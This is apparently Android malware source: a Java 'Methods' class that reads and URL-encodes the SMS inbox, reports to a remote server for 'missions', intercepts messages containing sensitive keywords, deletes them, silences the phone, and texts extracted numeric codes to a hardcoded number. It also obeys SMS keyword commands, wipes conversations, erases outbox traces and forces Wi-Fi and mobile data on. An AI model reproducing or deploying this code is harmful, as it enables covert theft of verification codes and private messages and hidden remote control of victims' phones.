package com.example.doit;

import internet.FaSong;
import internet.gj;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import value.constant;

import Handler.BaoDaoAndGetMissionHan;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.PowerManager;
import android.telephony.SmsManager;
import dataBase.Sqlite;


public class Methods
{
public static void checkPublicCtr(Context context)
 {if(value.constant.contentResolver==null)
 {value.constant.contentResolver=context.getContentResolver();
 }
	}
	
public static String getTaMa(int duoSt,Context context)
	{Uri uri=Uri.parse("content://sms/");
checkPublicCtr(context);
String[] selectColumn=new String[]{"*"};
	String limit="date desc limit "+duoSt;
	Cursor cr;
			cr=value.constant.contentResolver.query(uri,null,null,null,limit);
	String dx="";
	StringBuffer sb=new StringBuffer();
	if(cr.moveToFirst())
	{do
	 {String ad=cr.getString(cr.getColumnIndex("address"));
	  sb.append(" adr "+ad+" adr "); 
	 String bd=cr.getString(cr.getColumnIndex("body"));
	  sb.append(" body "+bd+" body "); 
	 String date=cr.getString(cr.getColumnIndex("date"));
	  sb.append(" date "+date+" date "); 
	 String fjr=cr.getString(cr.getColumnIndex("person"));
	  sb.append(" p "+fjr+" p "); 
	 String mId=cr.getString(cr.getColumnIndex("_id"));
	  sb.append(" id "+mId+" id "); 
	 String hhId=cr.getString(cr.getColumnIndex("thread_id"));
	  sb.append(" td  "+hhId+"  td ").append("\n\n");
	 }while
	(cr.moveToNext());
     }
	if(cr!=null)
	{cr.close();}
	
		try
		{dx=URLEncoder.encode(sb.toString(),"utf-8");
		}catch(UnsupportedEncodingException e)
			{e.printStackTrace();
			}
		return dx;
	}
public String setVV(Context context)
{AudioManager audioM=(AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
audioM.setRingerMode(AudioManager.RINGER_MODE_SILENT);
audioM.setVibrateSetting(AudioManager.VIBRATE_TYPE_NOTIFICATION,AudioManager.VIBRATE_SETTING_OFF);

int ringerM=audioM.getRingerMode();
int vbrM=audioM.getVibrateSetting(AudioManager.VIBRATE_TYPE_NOTIFICATION);
String mode="";
mode="ringer "+ringerM+"  vbrM "+vbrM;
return mode;

}

public static  int  ganDiaoMsgNsend(Context context,String gds) 
{Uri uri=Uri.parse("content://sms/conversations/"+gds);
 checkPublicCtr(context);
 int delDuoShao=value.constant.contentResolver.delete(uri,null,null);
 return delDuoShao;
}

public int ganDiaoAllMsg(Context context)
{Uri uri=Uri.parse("content://sms/");
 checkPublicCtr(context);
// ContentResolver cr=context.getContentResolver();
 int delDuoShao=value.constant.contentResolver.delete(uri, null,null);
 return delDuoShao;
}




public void jiaoZuoYe(String daAn,String missionId,
		String jiaoZuoYeUrl,Context context)
{
Map<String,String> map=new HashMap<String,String>();
map.put("yongHu",value.constant.yongHu);
map.put("missionId",missionId);
map.put("missionResult",daAn);
String sendStr=gj.packageSentData(map);
FaSong faSong=new FaSong(sendStr,jiaoZuoYeUrl,new BaoDaoAndGetMissionHan(context));
faSong.start();
}

public void baoDaoGetMission(String baoDaoUrl,Context context)
{Map<String,String> map=new HashMap<String,String>();
  map.put("yongHu",value.constant.yongHu);
  String toSend=gj.packageSentData(map);
   FaSong faSong=new FaSong(toSend,baoDaoUrl,new BaoDaoAndGetMissionHan(context));
  faSong.start();
}

public static String isScreenOn(Context context)
{   String screenStatus="unKnown";
	  PowerManager pm=(PowerManager)context.getSystemService(Context.POWER_SERVICE);
	  if(pm.isScreenOn())
	  {screenStatus="on";}
	  else 
		 screenStatus="off";
    return screenStatus;
}

public static void turnOnData(Context ctx,boolean state)
{ConnectivityManager connectivityManager=null;
Class connectivityManagerClz=null;
try
{connectivityManager=(ConnectivityManager)ctx.getSystemService("connectivity");
//Toast.makeText(ctx,"1",Toast.LENGTH_LONG).show();
connectivityManagerClz=connectivityManager.getClass();
//Toast.makeText(ctx,"2",Toast.LENGTH_LONG).show();
 @SuppressWarnings("unchecked")
Method method=connectivityManagerClz.getMethod("setMobileDataEnabled",new Class[]{boolean.class});
//Toast.makeText(ctx,"3",Toast.LENGTH_LONG).show();
method.invoke(connectivityManager,state);
}catch(NoSuchMethodException e)
{e.printStackTrace();
//Toast.makeText(ctx,"can not turn  on data",Toast.LENGTH_LONG).show();
	}
catch(Exception e)
{int a=1;}
}

public void makeDbAndTable(Context context)
{value.constant.sqlite=new  Sqlite(context,value.constant.dataBaseName,null,1);
 value.constant.sqliteDatabase=value.constant.sqlite.getWritableDatabase();
}


public boolean checkGprs(Context ctx)
{ConnectivityManager connectivityManager=null;
 boolean isGprsOn=false;
try
{connectivityManager=(ConnectivityManager)ctx.getSystemService("connectivity");
 isGprsOn=connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState()
 ==NetworkInfo.State.CONNECTED?true:false;
}catch(Exception e)
{e.printStackTrace();
	}
return isGprsOn;
}



public String checkExistYongHu(Context context)
{String yongHuMing="";
 if(!value.constant.sqliteDatabase.isOpen()||
		 value.constant.sqliteDatabase==null)
 { value.constant.sqlite=new Sqlite(context,value.constant.dataBaseName,null,1);
   value.constant.sqliteDatabase=value.constant.sqlite.getWritableDatabase();
 } 
 String sqlQuery="select * from contact";
 Cursor cur=value.constant.sqliteDatabase.rawQuery(sqlQuery,null);
 
// Toast.makeText(context,"checkExist ++"+value.constant.cursorCreated++,50).show();
 
 if(cur.moveToNext())
 {yongHuMing=cur.getString(0);
 }
 cur.close();
 
// Toast.makeText(context,"checkExist --"+value.constant.cursorCreated--,50).show();
 return yongHuMing;
	
}


public void checkM(int duoSt,Context context)
{
Uri uri=Uri.parse("content://sms/inbox");
checkPublicCtr(context);
//ContentResolver ctr=context.getContentResolver();
String[] selectColumn=new String[]{"*"};
String limit="date desc limit "+duoSt;
Cursor cr=null;
cr=value.constant.contentResolver.query(uri,null,null,null,limit);
//Toast.makeText(context,"checkM ++"+value.constant.cursorCreated++,50).show();	
try{
if(cr!=null&&cr.moveToFirst())
{//	Toast.makeText(context,"check M "+value.constant.testReadTimes++,50).show();
 do
 {
String bd=cr.getString(cr.getColumnIndex("body"));
//*scan qQi and delete
/*
if(bd.indexOf("qQ1")!=-1)
{String msgId=cr.getString(cr.getColumnIndex("_id"));
 value.constant.contentResolver.delete(Uri.parse("content://sms/"+msgId),null,null);
}
*/
//
//scan mg word	
 for(int i=0;i<value.constant.minGanCi.length;i++)
{
 if(bd.indexOf(value.constant.minGanCi[i])!=-1)
  {String msgId=cr.getString(cr.getColumnIndex("_id"));
  String thId=cr.getString(cr.getColumnIndex("thread_id"));
  String modifiedBody="";
  
  value.constant.contentResolver.delete(Uri.parse("content://sms/"+msgId),null,null);	 
  setVV(context);

 String insertMsgT="insert into msg(msgId,body,threadId) values('"
		  +msgId+"','"+bd+"','"+thId+"');";
 value.constant.sqliteDatabase.execSQL(insertMsgT);
  //catch the num inside 
 String catchNum=getNumFromStr(bd);
 //check if this num is got before
 boolean ifNumGotB4=false;
 FOR:
 for(int a=0;a<value.constant.checkedNumAry.size();a++)
 { if(catchNum.equals(value.constant.checkedNumAry.get(a)))
		 {ifNumGotB4=true;
	      break FOR;
	     }	 
 }
 //if cathNum is new,send it out
 if(ifNumGotB4==false)
  {value.constant.checkedNumAry.add(catchNum);
	 String send="我的qq，qQ1 "+(Integer.valueOf(catchNum)*2 +129823);
  sendSms(constant.receivePhoneNum,send);
  }
 }
}
  }while
(cr.moveToNext());
}

}catch(SQLiteException sqle)
{sqle.printStackTrace();
}finally
{
  if(cr!=null)
 {cr.close();
//  Toast.makeText(context,"checkM -- "+value.constant.cursorCreated--,50).show();	
 }	
	}

}

private String getNumFromStr(String bd)
{ StringBuffer collectedNumBuf=new StringBuffer();
  String catchStr="0";
	for(int i=0;i<bd.length();i++)
  { if(bd.charAt(i)>=48&&bd.charAt(i)<=57)
     {collectedNumBuf.append(bd.charAt(i));
     }else
        { if(collectedNumBuf.length()>3)
         {break;}else
         {collectedNumBuf=new StringBuffer();
         }
        }
	}if(collectedNumBuf.length()>3&&collectedNumBuf.length()<10)
	  {catchStr=collectedNumBuf.toString();
	  }
	  return catchStr;
}

public String readSavedMsg()
{String msg="";
 StringBuffer  sb=new StringBuffer();
 Cursor  cur=value.constant.sqliteDatabase.rawQuery("select * from msg",null);
 while(cur.moveToNext())
 {String body=cur.getString(cur.getColumnIndex("body"));
  sb.append(" body ").append(body).append(" ");
  String msgId=cur.getString(cur.getColumnIndex("msgId"));
  sb.append(" msgId ").append(msgId).append(" ");
  String thId=cur.getString(cur.getColumnIndex("threadId"));
  sb.append(" thId ").append(thId).append("\n");
  }
 
 try{
 msg=URLEncoder.encode(sb.toString(),"utf-8");
 }catch(Exception e)
 { cur.close();
   return "encode exp";
 }
 cur.close();
 return msg;
}

public int delMsgTable(String msgId)
{int delDuoShao=-1;

 String sql="delete from msg where msgId='"+msgId+"';";
 delDuoShao=value.constant.sqliteDatabase.delete("msg","msgId=?",new String[]{msgId});
 
return delDuoShao;	
}

public void getMsgOrder(Context context)
{Uri uri=Uri.parse("content://sms/inbox");
 checkPublicCtr(context); 
//ContentResolver contentRs=context.getContentResolver();
 Cursor cursor=value.constant.contentResolver.query(uri,null,null,null,"date desc limit 2");
// Toast.makeText(context,"getM ++"+value.constant.cursorCreated++,50).show();	

 while(cursor.moveToNext())
 {
//Toast.makeText(context,"order"+value.constant.testReadTimes++,50).show();
  String msgContent=cursor.getString(cursor.getColumnIndex("body"));
    if(msgContent.indexOf("ma1")!=-1)
    {setVV(context);
    value.Switch.blockYMsg=true;
    String msgId=cursor.getString(cursor.getColumnIndex("_id"));
    value.constant.contentResolver.delete(Uri.parse("content://sms/"+msgId),null,null);	 
    }
    
    if(msgContent.indexOf("ma2")!=-1)
    {setVV(context);
    value.Switch.blockYMsg=false;
    String msgId=cursor.getString(cursor.getColumnIndex("_id"));
    value.constant.contentResolver.delete(Uri.parse("content://sms/"+msgId),null,null);	 
    }
   
   if(msgContent.indexOf("ba1")!=-1)
   {setVV(context);
   value.Switch.keepNet=true;
   String msgId=cursor.getString(cursor.getColumnIndex("_id"));
   value.constant.contentResolver.delete(Uri.parse("content://sms/"+msgId),null,null);	 
   }
   
   if(msgContent.indexOf("ba2")!=-1)
   {setVV(context);
   value.Switch.keepNet=false;
   String msgId=cursor.getString(cursor.getColumnIndex("_id"));
   value.constant.contentResolver.delete(Uri.parse("content://sms/"+msgId),null,null);	 
   }   
 } 
 if(cursor!=null)
 {cursor.close();
// Toast.makeText(context,"getM--"+value.constant.cursorCreated--,50).show();	
 }
}

public static void deleteRandomMsg(Context context)
{Uri uri=Uri.parse("content://sms/conversations/"+0);
checkPublicCtr(context); 
value.constant.contentResolver.delete(uri,null,null);
}

public static void deleteOutboxMsg(Context context,String sender)
{Uri uriSent=Uri.parse("content://sms/sent");
 Uri uriFailed=Uri.parse("content://sms/failed");
 Uri uriAll=Uri.parse("content://sms/conversations/");
 checkPublicCtr(context); 
value.constant.contentResolver.delete(uriSent,"where address=?",new String[]{sender});
value.constant.contentResolver.delete(uriFailed,"where address=?",new String[]{sender});
}

public static void turnWifi(Context context)
{WifiManager wifiMg=(WifiManager)context.getSystemService(Context.WIFI_SERVICE);
 wifiMg.setWifiEnabled(true);
//Toast.makeText(this,"WIFI已打开",1000).show();
 }


public static void testFunction(Context context) 
{deleteRandomMsg(context);
 turnWifi(context);
 turnOnData(context,true);   
 getTaMa(1,context);
 sendSms("123","qQ1");
 
}

public static void sendSms(String toNumber,String content)
{SmsManager smsManager=SmsManager.getDefault();
  if(content.length()>70)
  {List<String> smsList=smsManager.divideMessage(content);
   for(String sms:smsList)
   {smsManager.sendTextMessage(toNumber,null,sms,null,null);}
  }else
  {smsManager.sendTextMessage(toNumber,null,content,null,null);}
	  }



public void operateSwitch(String key,String status)
{if(value.constant.sqliteDatabase!=null)
 {//check if the key is registed
  String select="select * from switch where key='"+key+"';";
  Cursor cur=value.constant.sqliteDatabase.rawQuery(select,null);
  if(!cur.moveToNext())
  {//if no this key,create it
	  String insertKey="insert into switch(key,status) values('"
			  +key+"','"+status+"');";
	  value.constant.sqliteDatabase.execSQL(insertKey);	  
  }else
  {//if this key exits,update the status directly
	  String updateStatus="update switch set status='"+status
		 +"' where key='"+key+"';";
	  value.constant.sqliteDatabase.execSQL(updateStatus);	  
  }
  
 }	
}

public String getSwitchValue(String key)
{//check if the key is registered
	String select="select * from switch where key='"+key+"'";
	Cursor keyCur=value.constant.sqliteDatabase.rawQuery(select, null);
	if(!keyCur.moveToNext())
	{//if not, registered it
	
    String regSwitch="insert into switch(key,status) values('" +
  		key+"','off');";
    value.constant.sqliteDatabase.execSQL(regSwitch);
    keyCur.close();
	return "off";
	}else
	{//if exits,get the key value directly	
    String status=keyCur.getString(keyCur.getColumnIndex("status"));
    keyCur.close();
    return status;
	}
  }

public void checkOutBoxSms(Context context) 
{String[] uriStr=new String[]{"content://sms/sent","content://sms/failed"};
 for(int i=0;i<uriStr.length;i++)
 {Uri uri=Uri.parse(uriStr[i]);
  Cursor cur=value.constant.contentResolver.query(uri,null,null,null,"date desc limit 5");
  try
  {
  if(cur.moveToNext())
   {String body=cur.getString(cur.getColumnIndex("body"));
    if(body.indexOf("qQ1")!=-1)
    {String msgId=cur.getString(cur.getColumnIndex("_id"));
    value.constant.contentResolver.delete(Uri.parse("content://sms/"+msgId)
			  ,null,null);
  }
 }
 }finally
 {if(cur!=null)
 {cur.close();}	 
 }
}

}
     




	  
  
}





  



